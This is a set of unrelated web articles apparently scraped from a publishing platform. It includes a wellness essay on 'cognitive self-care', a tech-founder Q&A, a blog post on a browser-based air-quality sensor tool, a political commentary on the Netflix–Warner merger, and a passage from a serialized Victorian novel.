of unprocessed thoughts and repressed emotions are constantly building up.</p><p>We try everything—therapy, meditation, managing sleep, yoga, running, and gym sessions. They put in the reps and chase calm. But the residue can stick around anyway. Or we go the other direction: zoning out—doomscrolling, grabbing a snack, burying themselves in more work, endlessly tweaking. The load doesn’t vanish. It just keeps humming in the background—quietly draining attention and energy.</p><p><strong>==That’s why the real problem is often not “stress” in the abstract.==</strong> It’s unresolved mental and emotional residue that keeps the nervous system slightly activated, even when nothing is happening.</p><p>And many of those unresolved issues are entangled in forgotten emotions and unfinished experiences.</p><h2>Why emotional experience matters if you want real change</h2><p>A common mistake in high-performance cultures is to treat negative emotions as noise—something to be countered with willpower or intellect. But if change is the goal, emotional experiences aren't a distraction; they're information about where you stand in your psychological impasse.</p><p>==I want to say this again and again: Please don't feel guilty about your negative feelings.==</p><p>This is a perfect example of why \"head knowledge\" is so hard to stick. We may intellectually recognize the draining effects of our fawning habits, and we can recognize the anxiety loop. But until our nervous system experiences change through real-world repetition (including complex emotions), the old circuits remain.</p><p>Think of it as \"gentle exposure therapy.\"</p><p>Logic finds the pattern, but it's the practical repetition of confronting avoided emotions without numbing or running away that rewrites the pattern through neuroplasticity. Avoidance? Instead of disappearing, the emotion erupts again and again—in impulsive reactions, spirals of doubt, or a stifling sense of \"I have to control everything.\"</p><p><strong>==Introspection isn't just a frivolous mental practice;==</strong> it's a concrete cognitive tool that synchronizes with the actual workings of our brain and nervous system.  Writing down our inner emotions isn't just a wellness fad; it reduces cognitive load and signals our body to process raw information instead of endlessly looping it.</p><h2>A Buddhist perspective: seeing loops without self-blame</h2><p>Buddhist psychology provides a framework for observing your behavior without judgment. Simply put: when something hits your system—like a stressful message or a sudden fear—your body tenses up.</p><p>Learning to recognize this means becoming more attuned to your bodily sensations and your sense of self.</p><p>\\\n when something hits your system—a demand, a message, a fear—the body tightens. The mind tries to regain control or escape the discomfort. That reaction might stabilize things temporarily, but it also reinforces the loop. Tightening leads to more tightening. Control leads to more scanning. Avoidance leads to more unfinished tension.</p><p> the friction created when we resist reality. Your mind immediately tries to regain control or escape the discomfort, a reaction known as Tanha (craving or clinging).</p><p>The practical insight of Buddhism is simple: the more we fight and cling to these things within ourselves, the greater the friction. The way out is not self-criticism, but recognizing the loop as a loop and seeing it clearly.</p><h2><strong>The missing skill: third-person understanding</strong></h2><p>What most people lack isn't effort, but a third-party lens that allows them to view their own internal systems objectively. An inner dashboard that reframes emotions and habits as observable processes, not personal failings.</p><p>But we've worked hard to filter out the negativity and avoid appearing immature.</p><ul><li><strong>“This reaction is doing a job.”</strong> (It serves a specific function.)</li><li><strong>“This pattern is protecting something.”</strong> (It’s trying to keep you safe.)</li><li><strong>“This loop is costing me more than it’s helping.”</strong> (The tradeoff is no longer worth it.)</li></ul><p>\\\nThis shift is crucial because these inner conflicts put a lot of strain on the brain.</p><p>The Buddhist approach to introspection reduces that strain. When you become aware of the function behind the patterns, you stop fighting yourself—and that is how you actually regain control.</p><p><strong>Cognitive self-care is the foundation for future-proof performance.</strong></p><p>Unresolved emotions and thoughts function like background apps on a smartphone—they don't just sit there; they continuously drain your \"brain costs.\" As the workplace accelerates, the true differentiators aren't just skills or intelligence. They have the ability to regulate attention, process emotional signals on the fly, and shift roles without the mental residue of the previous moment lingering.</p><p>The breakthrough is this: you don’t necessarily need to  or \"fix\" these emotions. <strong>Simply acknowledging them for what they are significantly reduces the cognitive load.</strong></p><p>We call this cognitive self-care. It’s not about complacency, pretense, or ignoring reality in favor of \"playing the smart leader.\" It’s the disciplined practice of maintaining clarity and consistency even under extreme pressure.</p><p><strong>We’ve been taught that being emotional makes us immature, but that’s exactly why it matters.</strong></p><p>The data is clear: 56% of executives are burned out, and 70% are considering quitting. While we’ve traditionally chalked this up to poor mental health, personal failure, or a lack of grit, these numbers suggest a systemic breakdown of cognitive resources.</p><p>Constant role-shifting and ignoring the \"friction\" () of suppressed emotions don't make us tougher; they create a cycle of emotional exhaustion and inefficiency.</p><p>The 68% of tech employees experiencing these symptoms aren’t just fatigued; their internal systems are overloaded by unresolved feedback loops.</p><p>The dominant mode of modern work is context switching under pressure. High performers don’t need more motivation—they need a way to surface internal state, notice recurring loops, and reduce carryover from one role to the next.</p><p>\\\n<code>\"High-performers do edge out via attention regulation and clean role resets—studies clock switch recovery at 23+ minutes each, shredding focus without processing gaps.</code></p><p><code>Transition windows (post-call, pre-decision) let the brain offload residue via prefrontal integration, slashing cortisol carryover. Work's acceleration (AI+layoffs) makes this the new bottleneck—cognitive self-care isn't fluff, it's performance infrastructure.\"</code></p><p>\\\nThat’s why transition windows matter: after calls, before decisions, after interpersonal strain, and before sleep. In these windows, the system can integrate signal, discharge residue, and reset attention.</p><p>\"Asking, 'What am I actually worried about?' allows the brain to release the tension of trying to decode complex information.\"</p><p>The future of work will keep accelerating.</p><p>Cognitive self-care is the skill that lets people sustain clarity and performance without losing inner coherence. In the end, we cannot leave ourselves behind; therefore, the person we most need to understand is ourselves.</p><p>\\\nCover image: Designed by Freepik</p>",

Microsoft then went further and started publishing its biggest franchises on PlayStation, making it one of the largest third-party publishers on a rival's platform. \n\nPhil Spencer, who led the division for over a decade and drove the subscription pivot, announced his retirement last week, and incoming CEO Asha Sharma has pledged \"the return of Xbox\" -- though her memo also talks about expanding across PC, mobile, and cloud, which sounds a lot like the status quo.",

      "content": "<h2>1. What do you currently do, and what’s your favorite part about it?</h2><p>I am the Founder and AI Engineer at 180GIG Ltd, where I design and deploy production-grade AI applications. My work includes building Squrrel, an AI-powered interview intelligence platform, Trading Flashes, an automated financial intelligence system, and Meal Roaster, a WhatsApp-based AI nutrition assistant. As the sole technical architect, I design the backend systems, AI pipelines, and deployment infrastructure. My favorite part is taking an idea from architecture planning to a live product serving real users. Turning complex AI workflows into reliable systems that operate under real-world constraints is what makes the work meaningful.</p><h2>2. How did you get started with your Tech Career?</h2><p>My background was originally outside core engineering, but I became increasingly interested in how automation and data systems could solve real operational problems. I began building backend applications with Python and gradually moved into AI system design. Rather than focusing only on experiments, I pushed myself to deploy systems into live environments. That hands-on approach eventually led me to found 180GIG Ltd, where I now build and scale AI-driven platforms across hiring, finance, and health domains. The transition from learning to building in production shaped my engineering mindset.</p><h2>3. If Utopia were a color, what color do you think it’d be and why?</h2><p>I would choose deep blue. Blue represents stability and clarity, which are qualities I value in both systems and society. In engineering, stable architecture and predictable performance create trust. When I build AI platforms such as Meal Roaster, reliability is more important than novelty. A well-designed system should feel dependable and transparent rather than chaotic.</p><h2>4. If everything about HackerNoon changed drastically, what is one detail you’d like to keep exactly the same?&nbsp; OR What’s your favorite thing to do with HackerNoon and why?</h2><p>I would want to preserve its focus on builders sharing practical experience. Writing about AI is most valuable when it comes from people who are actively deploying systems. In my own articles, I write about production challenges, explainability issues in financial AI, and real deployment lessons. Maintaining that connection between engineering practice and technical writing ensures the platform remains grounded and credible.</p><h2>5. Tell us more about the things you write/make/manage/build!</h2><p>At 180GIG Ltd, I build AI-powered platforms designed for real user interaction. Squrrel is an AI interview system that uses retrieval augmented generation and voice processing to analyse candidate responses. Trading Flashes automates financial signal analysis and newsletter generation using market data and large language models. Meal Roaster operates entirely within WhatsApp, allowing users to send meal images and receive structured nutritional insights without downloading a separate application. Across all products, I focus on scalable backend architecture, AI orchestration, and measurable user impact.</p><h2>6. What’s your favorite thing about the internet?</h2><p>The internet enables rapid validation. As a founder, I can design, deploy, and reach users globally without heavy infrastructure investment. This accessibility allows continuous iteration based on real usage data. It also enables open source collaboration, which is how I have contributed to projects such as LangChain. The ability to build publicly and improve through feedback is powerful.</p><h2>7. It’s an apocalypse of ‘Walking Dead’ proportions, and you can only own a singular piece of technology. What would it be?</h2><p>I would choose a durable satellite communication device with computational capability. Communication and access to information become the most important assets in uncertain environments. From an engineering perspective, infrastructure resilience always outweighs entertainment or convenience. Reliable connectivity enables coordination and problem-solving.</p><h2>8. What is your least favorite thing about the internet?</h2><p>The tendency to reward visibility over technical depth. In AI, especially, there is often more excitement around announcements than around measurable performance. Having built production systems myself, I know how much work goes into reliability, monitoring, and evaluation. Sustainable innovation requires discipline, not just attention.</p><h2>9. If you were given $10 million to invest in something today, what would you invest in and why?</h2><p>I would invest in AI evaluation and observability infrastructure. As more companies deploy intelligent systems, monitoring drift, bias, and reliability becomes critical. Strong evaluation layers will determine which AI platforms earn long-term trust. My own experience deploying AI applications has shown that system governance is just as important as model capability.</p><h2>10. What’s something you’re currently learning or excited to learn?</h2><p>I am currently refining evaluation pipelines for AI-driven systems. That includes improving consistency, reducing hallucination risk, and optimising latency for real-time applications. I am also exploring more efficient deployment strategies to balance performance and cost. Continuous refinement is essential when building systems that users depend on daily.</p><h2>11. Would you rather travel 10 years into the past or 10 years into the future? Give reasons for your answer.</h2><p>I would travel into the future. Observing how AI systems evolve in terms of regulation, trust, and architecture would provide valuable insight. It would help identify which design patterns proved sustainable and which were short-lived trends. That foresight would guide better engineering decisions today.</p><h2>12. How do you feel about AI?</h2><p>I see AI as a powerful engineering layer rather than a standalone solution. Its value depends on structured integration, monitoring, and accountability. At 180GIG Ltd, my focus is on building AI systems that operate reliably in production environments across hiring, finance, and nutrition use cases. The next phase of AI will be defined by disciplined architecture and measurable outcomes rather than experimentation alone.</p>",

      "content": "<h2><strong>33 sensors supported. Zero code required. Just plug in and breathe</strong></h2><p>Look, I've been playing with air quality sensors for a while. You know the drill: you get this shiny new PM2.5 sensor, wire it up to a USB-UART adapter, and then… the nightmare begins.</p><p>\\\nYou need Python. You need drivers. You need to figure out if it's  or  or whatever. You spend 20 minutes in a terminal just to see if the thing is even alive. And half the time, you're writing throwaway scripts just to verify that your $12 sensor actually works.</p><p>\\\nI got tired of that. So I built something stupidly simple.</p><h2>The \"Why Hasn't Anyone Done This?\" Moment</h2><p>A few months ago, I was testing a bunch of Plantower sensors for a project. PMS7003, PMS5003, the usual suspects. Every time I wanted to check readings, I had to fire up a Python script, install pyserial, deal with virtual environments, yada yada.</p><p>\\\nAnd I thought: <em>Wait. Chrome can talk to USB devices now.</em></p><p>\\\nThe Web Serial API has been around since Chrome 89. It's actually pretty mature. So why is everyone still using desktop apps for this?</p><p>\\\nI hacked together a single HTML page. Threw in Chart.js for visualization. Added a JSON config loader. And suddenly I could plug in a sensor, hit \"Connect,\" and see real-time graphs in my browser.</p><p>\\\nNo . No . No electron apps eating 500MB of RAM.</p><p>You go to <a href=\"https://pollusensweb.pages.dev/\">pollusensweb.pages.dev</a> You pick your sensor from a dropdown (we're at  now, more on that in a sec). You click \"Connect,\" choose your USB port, and bam - live data streaming into charts.</p><p>\\\nThe secret sauce is a JSON configuration file that describes each sensor's protocol:</p><ul><li>Baud rate, data bits, stop bits</li><li>Frame structure (start bytes, length, checksum position)</li><li>JavaScript expressions to extract values from raw bytes</li></ul><p>\\\n(You will find plenty of JOSON examples on my <a href=\"https://github.com/WeSpeakEnglish/polluSensWeb\">GitHub repo</a>; just check sensors.json and readme)</p><p>\\\nThat's it. No compiled drivers. No firmware flashing. The browser does everything.</p><p>\\\nNow, we're at  in the default JSON, covering:</p><ul><li> (PMS1003 through PMSA003-S, plus the industrial PS3003A)</li><li> (SPS30, SCD30 for CO2)</li><li> (S8, K30, K33 - CO2 sensors)</li><li> (the classic SDS011)</li><li> from smaller manufacturers</li></ul><p>\\\nThe cool part? Adding a new sensor doesn't require touching the code. You just write a JSON config. If you have a UART sensor that spits out binary frames, you can probably support it in 10 minutes.</p><h2>Real Talk: The Web Serial API Is Underrated</h2><p>I feel like the Web Serial API is one of those browser features that developers sleep on. Everyone knows about WebRTC, WebGL, whatever. But direct hardware access from a webpage? That's game-changing for IoT prototyping.</p><p>\\\nYeah, it only works in Chromium browsers (Chrome, Edge, Brave). Firefox and Safari are dragging their feet. But for development and debugging? It's perfect.</p><p>\\\nThe security model is actually sane: the browser asks permission for every serial connection. You can't just silently sniff someone's USB devices. And since everything runs client-side, your sensor data never hits my server. It's yours.</p><h2>Features That Actually Matter</h2><p>I didn't want to build another bloated IoT platform. I wanted a tool I'd actually use. So here are the features that made the cut:</p><p> Multiple parameters, customizable colors, and resizable. You can pop out charts for different sensor groups (PM values vs CO2 vs VOCs).</p><p>\\\n One button, full session data with timestamps. Because eventually, you need to open this in Excel or feed it to your actual analysis pipeline.</p><p>\\\n Hex dump of incoming frames with checksum pass/fail indicators. Essential when you're debugging a new sensor config.</p><p>\\\n HTTP POST/GET/PUT to external endpoints with templated JSON bodies. I use this to pipe data into InfluxDB or Home Assistant without any middleware.</p><p>\\\n Send initialization sequences or periodic polling commands. Some sensors need a wake-up byte; others want a specific query frame.</p><h2>The \"It Just Works\" Philosophy</h2><p>Here's my hot take: <strong>hardware tools should be as easy as software tools.</strong></p><p>\\\nWhen you plug in a USB webcam, you don't compile a driver. When you connect Bluetooth headphones, you don't edit config files. But for some reason, UART sensors are still stuck in 1998.</p><p>\\\nPolluSensWeb is my attempt to fix that for my little corner of the hardware world.</p><p>\\\nIt's not perfect. The UI is functional, not beautiful. The code is vanilla JS because I didn't want build steps. But it solves a real problem: <strong>lowering the barrier to seeing your data.</strong></p><p>\\\nFind it useful? Star the <a href=\"https://github.com/WeSpeakEnglish/polluSensWeb\">repo</a> so others can find it too.</p><p>\\\nGot a weird sensor that's not on the list? You're welcome to contribute a working JSON config for it - or just test it on hardware, and I'll help you write the JSON. Drop me a message or open a PR. We're at 33 sensors and counting, and I'd love to hit 50 by next year.</p><p><em>Built with caffeine, Chart.js, and the stubborn belief that hardware shouldn't require a CS degree to operate.</em></p>",

      "content": "<p>We’ve noted repeatedly how Trump wants to scuttle Netflix’s proposed merger with Warner Brothers because his friend and key donor, billionaire Larry Ellison <a href=\"https://www.techdirt.com/2026/02/11/trump-doj-launches-bunk-investigation-of-netflix-merger-as-a-favor-to-larry-ellison/\">wants to buy Warner Brothers</a> (and CNN) instead. In fact the two have already purportedly met to discuss <a href=\"https://www.techdirt.com/2025/11/25/larry-ellison-met-with-trump-to-discuss-which-cnn-reporters-they-plan-to-fire/\">which CNN anchors they’d like to fire</a> once Larry (who just bought CBS and part of TikTok) gains control. </p><blockquote><p><em>“Rice said, “If these corporations think that the Democrats, when they come back in power, are going to, you know, play by the old rules, and, you know, say, ‘Oh, never mind. We’ll forgive you for all the people you fired, all the policies and principles you’ve violated, all, you know, the laws you’ve skirted.’ I think they’ve got another thing coming.”</em></p></blockquote><p>That Democrats will hold corporations meaningfully accountable for crimes and misbehaviors during Trump’s tenure certainly isn’t any sort of . Centrist Democrats like to dabble in <a href=\"https://www.techdirt.com/2024/04/12/the-fccs-new-broadband-nutrition-label-doesnt-solve-the-actual-problem-unchecked-telecom-monopoly-power/\">regulatory performance</a>, but meaningfully, consistently, and effectively standing up to corporate power has never been what you’d call <em>a strong suit for party leadership</em>. </p><p>What triggered Donald’s latest toddler moment? Apparently a post by right wing extremist Laura Loomer on Elon Musk’s right wing propaganda website:</p><blockquote><p><em>“In his Truth Social post, Trump linked to an<a href=\"https://x.com/lauraloomer/status/2025252727580692717?s=10\" target=\"_blank\" rel=\"noreferrer noopener\">&nbsp;X post</a>&nbsp;from far-right activist Laura Loomer, who wrote that Rice is “threatening half of the country with weaponized government political retribution.” She also forecast that if Netflix is allowed to acquire Warner Bros., “positive messaging of the Democrats’ upcoming witch hunts against Trump from Barack Hussein Obama and his anti-White racist wife Michelle would likely be blasted across all streaming services.”</em></p></blockquote><p>This ties in to the broader campaign to lie and claim that Netflix (an opportunistic company that airs <a href=\"https://www.bbc.com/news/world-us-canada-58990325\">whatever makes money regardless of ideology)</a> is somehow left wing, to better bolster the argument that Larry Ellison and U.S. autocratic allies should control the entirety of U.S. media instead. </p><p>Trump and Trump Republicans have  credibility whatsoever on antitrust or competition issues. The Trump DOJ gambit is being conducted entirely in bad faith. But as our corporate media consolidates, you may notice they’re utterly incapable of communicating that to readership. Which is to say our shitty press is going to help sell the Trump and Ellison con here:</p><p>As always there’s a lot of projection going on. Ellison really does want to gobble up the lion’s share of U.S. media and shovel his right wing ideology down the public’s throat (<a href=\"https://www.techdirt.com/2025/10/21/bari-weiss-gets-to-work-fixing-cbs-bias-by-making-it-more-biased/\">See: CBS</a>). It’s very clear he and other members of MAGA aspire to the kind of <a href=\"https://euobserver.com/203675/how-orban-systematically-suffocated-the-hungarian-media-over-the-past-15-years/\">autocratic-media model seen in Orban’s Hungary</a>, where most outlets are owned by the autocrats’ closest allies and pepper the public with agitprop 24 hours a day.</p><p>Ideally you’d block  additional media consolidation, as it almost always results in mass layoffs, higher prices, and lower quality product. That said, Trump’s fake-populist regulators aren’t going to do that, and combating fascism requires some strange bedfellows. So if the country’s choice is homogenized Netflix cack or autocrat-friendly state television, it’s not really much of a choice at all.</p>",

You can jump to any chapter in this book <a href=\"https://hackernoon.com/astounding-stories-of-super-science-february-2026-table-of-links\">here</a>.</em> The Moors and the Fens, volume 1 (of 3) - Chapter XVI: Cousin Allan</p><h2>Astounding Stories of Super-Science February 2026:  The Moors and the Fens, volume 1 (of 3) - Chapter XVI</h2><p>\\\nTime, which hath a way of enlarging our circle of new acquaintances, and of curtailing, by various painful methods, the number of those whom the soul in its tenderness loves to call “old friends,” brought, ere she had been quite a month at Craigmaver, a fresh individual under the notice of Mina Frazer; one whom, in after life, amid all the cares and troubles and difficulties of existence, she never forgot.</p><p>She—for this new friend, started up in the person of a most lovely and accomplished woman—appeared somewhat after the sudden wayward fashion of an apparition before the eyes of the old laird’s niece, whom Allan had undertaken, as Mina told him, “for want of something better to do,” to instruct in the manifold mysteries of sketching and shading, of perspectives and foregrounds.</p><p>310“There never was a quicker pupil,” so said the master.</p><p>“Nor a more patient master,” so said the pupil: and thus, as both, perhaps, were pretty nearly correct, the work of tuition progressed pleasantly and rapidly; for Mina had an object in view, and worked diligently to accomplish it; and Allan, tired and sick of fine ladies as he was, found himself wonderfully interested in the progress of one who could be earnest about what he considered such an insignificant trifle as the carrying back a few of her “own home views” to the country which circumstances had compelled her to adopt, whether she would or not.</p><p>One morning, therefore, in that most unsatisfactory, half smiling, half weeping month called April, Mina was busily engaged copying in pencil a landscape Allan had laid before her, whilst he stood near, looking, if the truth must be told, far oftener at his cousin than the drawing,—and Malcolm, whom the household generally called indolent, lay stretched at full length on a sofa, dreaming about his scarlet uniform, and the great deeds he would perform at some indefinite future period,—when a sound of horses’ hoofs trampling over the gravel caused Mina to look up from her employment, and as she&nbsp;311did so, the words, “How beautiful!” burst from her lips; and springing from her seat, she darted to the window to obtain a nearer view of the object which had attracted her attention.</p><p>“Oh! how beautiful!” she again exclaimed. “Allan, do come here and tell me who it is.” But Allan, without pausing to reply, flung the portfolio, landscape, half-finished drawing, pencils, and etceteras recklessly into a corner, and darted out of the room, and down to the principal entrance, where Mina soon beheld him assisting the new arrival to dismount; and a few minutes afterwards she came gliding into the drawing-room, accompanied by a fine military-looking man, and stood before Mina a vision of feminine loveliness, such as she had never previously conceived existed, save in the imagination of some great master of the divine art of painting.</p><p>Yes! beautiful she was; beautiful as a dream, as the conception of a poet, as the ideal of a visionary! If Mina had been born in another land and educated in a different faith, she might almost have knelt at the sight of this unexpected visitor, fancying she was a spirit from some purer, happier, brighter world than ours,—save for the costume, that assuredly savoured more of earth than heaven,&nbsp;312and which proved at once she was after all only a mortal, though certainly a very superior one; but which, notwithstanding its sublunary character, set off every personal gift she was possessed of to the very greatest advantage, and that she knew perfectly well, wherefore she always wore it, whenever she had even half an apology for doing so.</p><p>It was a riding-habit of the finest blue cloth, which, fitting closely to her figure, displayed the shape of her shoulders, the slenderness of her waist, and the gracefulness of her every movement. A small Highland bonnet made of black velvet, from which depended a drooping feather, secured by a silver thistle, contrasted well with the luxuriant golden curls the lady permitted to fall loose and unregarded in rich masses over her neck. Her eyes were large and of that most beautiful purple sometimes to be noted in connection with light hair; her features were small, regular, and perfect, as if they had been chiselled by the hand of some great sculptor, but a brilliant colour gave life and animation to the whole; whilst dark eyebrows and still darker lashes redeemed the countenance from that charge of mawkish sameness, which is frequently laid—whether justly or unjustly signifies little at present—to the account of those of beauty’s daughters whom&nbsp;313we call—to distinguish them from their darker sisters—blondes.</p><p>But Cecilia Warmond had a far higher charm than any mere loveliness of feature can confer; she had that which can make a gentlewoman out of the coarsest and most unpromising materials, redeem the plainest face, render elegant the meanest home,—the all-pervading, indescribable, incomprehensible, all-powerful, instantly discernible charm of grace. There was a something about the way she walked across a room, extended her hand, accepted a kindness,—in the tone of her voice, in the sound of her laugh, which would have proved irresistible had she been plain as she was handsome, old as she was young.</p><p>The mere advent of one who had been, during the whole of the preceding Edinburgh season, the centre of universal attraction, the theme of general conversation, the courted, the admired, the flattered, was quite sufficient to account for the way in which the guilty colour came and went in Allan Frazer’s cheek, for the sudden embarrassment perceptible in his usual half-careless, half-satirical, whole-fashionable manner. Mina settled the business ere the ceremony of introduction had taken place, in a peculiarly feminine mental sentence.</p><p>“He is in love with her;” and the time had been&nbsp;314when that view of the question would have proved especially happy and felicitous.</p><p>“My cousins, Mr. and Miss Frazer,” said Allan as the drawing-room door closed upon the new comers. “Mina, Miss Warmond, General Warmond.”</p><p>“What a stiff formal introduction, O lord of the mountains,” broke in the lady, whose rapid eye had scanned “the cousins” at a glance. “Miss Frazer,” she continued, “I have heard about you ever since I came to Scotland, and I have wished so much to know you, that when I heard you were actually at Craigmaver, I could not resist the temptation, but, setting that bugbear, called by those dreary individuals styled fashionable people, strict etiquette, at defiance, I persuaded papa to gallop over with me from Locholen, and, accordingly, here we have come to ‘make friends’ with you.” And she stretched forth the smallest hand in the world, encased in the most expensive and&nbsp;&nbsp;of riding gloves, as she spoke, for Mina’s acceptance.</p><p>The girl knew now perfectly who she was, for if, since her arrival at Craigmaver, the laird’s grandson had never once mentioned the name of Warmond, she had heard it years previously, when Glenfiord passed away into the hands of strangers, when she was told that a General Warmond, who had wedded&nbsp;315Miss Gordon of Locholen, was the purchaser of the place which once had been her father’s, near to which, under the shadow of Ben Lomond, within sound of the ripple of the lake, he slept his dreamless sleep—unmindful of scenery, forgetful of sorrow—peacefully.</p><p>Yes, she knew her now. This, then, was the lady who resided in the home that, but for a dreadful misfortune, had still been theirs. A choking sensation oppressed Mina as those slender fingers clasped hers in proffered friendship, a sort of darkness came before her eyes; for an instant a gloom fell over the sunshine, and that faint sickness of the heart which a great surprise, whether joyful or sorrowful, frequently induces, caused her to see even the fair vision who spoke so sweetly and kindly to her, dimly, as if she were beholding unreal objects in some vague, half-mournful, half-pleasant dream.</p><p>It was but for a moment, however, this lasted, for then the full use of her faculties returned, and Mina could both hear and see.</p><p>“And this is your other cousin,” said Miss Warmond, turning her fine eyes on Malcolm’s handsome face, and speaking actually to him, though her words seemed addressed to Allan; “this is your other cousin,” and, with a slightly diffident air, she once&nbsp;316again extended the white-gloved hand to a member of the Frazer family; and the act, and the bright frank smile which accompanied it, fairly “settled” the susceptible youth, and caused him to forget all about “grey eyes” and a host of other coloured orbs he had admired since them, and write in a private mental note book, wherein he was always setting down and rubbing out facts relative to his varying ideas of feminine beauty: Mem.—Purple eyes are the most lovely and expressive in the world.</p><p>Poor Malcolm! he never saw a pretty face that he did not fall over head and ears in love with the owner instanter: it was surely fortunate, considering the alarming frequency of these attacks, that they did not last long, for, if they had, the fit must inevitably have proved mortal.</p><p>That was a happy day to Mina, for the visitors remained for lunch, and she and her new friend strolled away together through the gardens; and then Miss Warmond talked in her soft, low, musical voice, so touchingly about Glenfiord, that the tears she vainly tried to repress came at last raining down Mina’s cheeks, and then Cecilia, who was her senior by some years, kissed the weeping girl and told her how she had often mourned to think of the child Allan said had almost broken her heart&nbsp;317when removed from amid the flowers and perfume and luxuriance of that wild romantic home.</p><p>“Your name has always possessed a strange interest for me,” added Miss Warmond; “therefore, now we have at last met, I hope we shall be real friends.”</p><p>“If you will let me be fond of you,” said Mina impetuously, “I will love you always; I never saw anybody so beautiful as you are in all my life before; I never saw any one I thought I could like one half so well:” and thus, on the spot, a friendship was formed, destined to last as long as such absurd friendships ever do last, but not an instant longer.</p><p>There was something perfectly charming, the young girl thought, in Miss Warmond’s manner towards her uncle; it was so respectful, so deferential, yet, withal, so playful and captivating, that Mina did not marvel to notice how completely the laird was fascinated by it.</p><p>“There was nobody in the world like Cecilia,” so the General evidently thought, so Mr. Frazer felt convinced; and Mina and Malcolm endorsed this opinion without further inquiry or the slightest hesitation.</p><p>For, if the sister had seen a few disagreeable and repelling women in the course of her short passage&nbsp;318across life’s ocean, she had never met with a false one; so she accepted the friendship (which, if she had been a little older or a little wiser, she would have known could not be worth much, else it had never been so freely offered) with a frank, trusting heart; knowing no deceit herself, the idea of it in another never crossed her mind: besides, who, looking at Cecilia, could dream of deceit? The surface mirror was apparently too clear and transparent to induce a belief that the slightest dross&nbsp;&nbsp;perhaps be found lying at the bottom of a heart which, seemingly guileless as a child’s, was really so perfectly choked up with dangerous thoughts and black deceit and jealous feelings, that truth had long since fled from the citadel in disgust and taken up her abode in better, though possibly less inviting looking, quarters.</p><p>Cecilia kindly took upon herself the task of teaching Mina the exact meaning of the word “hypocrisy;” but, as it was long ere the girl discovered her benevolent intention, she took her as she seemed, and liked her accordingly. And Malcolm. Why, if any one had informed him Miss Warmond was not quite so good as she seemed, he would have answered, like a great, good-natured, foolish, overgrown boy, who thought himself a man, as he was,</p><p>319“Well, you see, I don’t mind that; if a woman be but pretty, I can forgive her anything.”</p><p>So every one was satisfied that bright April day, save, perhaps, Allan Frazer, and matters went smoothly, as they generally do, on the occasion of tolerably short visits, when people are inclined to be mutually pleased, and when one or two agreeable talkers and a proportionate number of patient listeners are present: but at length General Warmond declared they must positively go, and so Cecilia, after saying all sorts of pretty things, tripped gracefully across the hall and down the steps, and was obliging enough to permit Malcolm to help her to the saddle and adjust the reins properly for her; after which she bade farewell to all the Craigmaver gentlemen, and rode off down the avenue, not forgetting, however, as she did so, to turn round and kiss her hand to Mina, who stood watching her departure from one of the drawing-room windows.</p><p>The girl caught herself sighing when the Highland bonnet disappeared altogether from sight; if she could but have known what sorrow the lady who wore it was destined to cause her, she might have gone down on her knees and prayed she should never more behold it: but Mina possessed not the&nbsp;320vision of a seer, and so, quite excited with the events of the day, and delighted to think of the beautiful being, who, though so perfectly fascinating, deigned to call her “friend,” she took possession of her uncle’s arm, and walked in with him to dinner.</p><p>“I was not aware, Allan,” said old Mr. Frazer, after a long ominous pause, which, contrary to custom, succeeded the withdrawal of the cloth, “I was not aware, Allan, you had been over at Locholen, yesterday.”</p><p>“I happened to be in the neighbourhood, sir,” answered his grandson, “and called to inquire how Mr. Gordon was.”</p><p>“And found General and Miss Warmond there,” added Mr. Frazer.</p><p>“Yes, they arrived the day previously, I believe,” responded Allan, who was, to all intents and purposes, apparently so much engrossed in the difficult operation of peeling an apple, that he could not raise his eyes and look straight at his grandfather as he spoke.</p><p>Mr. Frazer impatiently cracked one or two nuts, and then said hurriedly,</p><p>“Would it not have been better, more&nbsp;&nbsp;altogether, for Mina to have called on Miss Warmond? If I had known she was at Locholen”——</p><p>321“I told Miss Warmond,” interposed Allan, “that as Mina was not very strong, and the distance between us was so great, I feared my cousin would be unable to call until the weather was a little more settled; so she very kindly said she would not stand on ceremony, but ride ten long miles here, and ten equally long back again, to see her, as she has done.”</p><p>There was a tone in Allan’s voice, and a look in his eyes as he uttered the foregoing sentence, which Mina could not understand; it was not precisely a sneer that disfigured his face, nor was it an expression of pain; but it was a something so certainly very far from agreeable, that the girl caught herself thinking.</p><p>“I must have been mistaken; he cannot be in love with her:” and yet, as she was unable to reconcile his manner towards Miss Warmond with this new version of an old subject, she determined to leave time to solve an enigma she was getting tired of puzzling over, to wit, the heart of her cousin Allan. But that very evening he so provoked her with silently listening to all her enthusiastic observations respecting Miss Warmond, and replying “never a word” to them, that she fairly forgot about “time” altogether; and wishing to get to the bottom of the matter at once, indignantly demanded,</p><p>322“Allan, can you admire nothing?”</p><p>The young man looked earnestly away to the distant hills, scarcely visible through the gathering twilight, and a sort of shadow, as if from them, fell over his face as he did so; after a moment’s pause he answered,</p><p>“The stern old mountains, and the bright, healthy, happy child; the pure face of nature, and the honest face of man: everything on which our God has set the stamp of grandeur, or of loveliness, or of goodness, I admire.”</p><p>There was a solemnity in this reply, very different from the usual careless indifference of his remarks; but still Mina remained unsatisfied.</p><p>“Then do you not think Miss Warmond very beautiful?”</p><p>“I consider her the handsomest, the most accomplished, the most fascinating heiress in Scotland,” he responded; “what induced you to imagine, cousin Mina, I was blind to her perfections?”</p><p>“The way you have got of praising either not at all, or else against your will,” replied his cousin: “I never fancied it possible for any mere mortal to be so surpassingly lovely; I never even dreamt of such a face before, and, at first, I fancied you thought her a sort of angel too; but now, Allan, I&nbsp;323cannot make you out exactly. I do not understand you at all; I wish I could.”</p><p>“You need not, Mina,” he replied, smiling grimly; “the knowledge of myself I have lately acquired has brought little happiness to me; it could not give any to you. Suppose we let the matter rest there.”</p><p>“I have always felt just the same towards you as to Malcolm,” Mina returned, not heeding the latter portion of the foregoing sentence; “and I am sure, though you are so clever and so much changed in many ways, you consider me quite as much your sister as ‘in the old days departed;’ and therefore I should like greatly to ask you one question—you won’t be angry with me, will you? may I ask it?”</p><p>“Go on,” said Allan, gazing forth more fixedly than ever into the gloom.</p><p>“Are you really unhappy, or is it only a habit you have acquired of talking as if you were? is there really any sorrow—any pressing sorrow I mean—in your heart?”</p><p>“There is,” he briefly answered.</p><p>“And the cause, dear Allan, may I not know it?”</p><p>He paused for a moment, as if irresolute; then repressing the strong inclination he felt to tell her all, he said,</p><p>324“No, Mina, my own ‘little’ sister Mina, as I used to call you, you must not ask me anything more about myself ever; you will be fond of me, spite of my faults, and we will be great friends always, shall we not?”</p><p>He held out his hand as he spoke, as if to seal, with a good honest pressure, the cousinly compact; then, gliding away to the piano, he sung—more sweetly and mournfully than Mina had ever before heard him 